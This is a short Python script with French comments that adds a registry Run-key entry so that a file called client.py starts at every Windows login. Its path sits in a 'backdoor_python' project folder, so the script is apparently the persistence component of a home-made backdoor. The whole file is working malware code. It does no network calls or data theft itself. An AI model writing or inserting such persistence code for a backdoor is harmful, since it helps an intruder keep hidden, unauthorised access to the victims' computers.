import os
import sys
import winreg

def add_to_startup():
    # Nom de la clé (peut être personnalisé)
    key_name = "clepythonbd"

    # Chemin du script Python
    script_path = "C:\\Users\\kytbp\\Desktop\\backdoor_python\\V0.3\\client.py"

    # Ouvre la clé de registre pour le démarrage (HKCU\Software\Microsoft\Windows\CurrentVersion\Run)
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)

    # Ajoute le script au démarrage
    winreg.SetValueEx(key, key_name, 0, winreg.REG_SZ, script_path)

    # Ferme la clé
    winreg.CloseKey(key)

    print(f"Ajouté au démarrage : {script_path}")

if __name__ == "__main__":
    add_to_startup()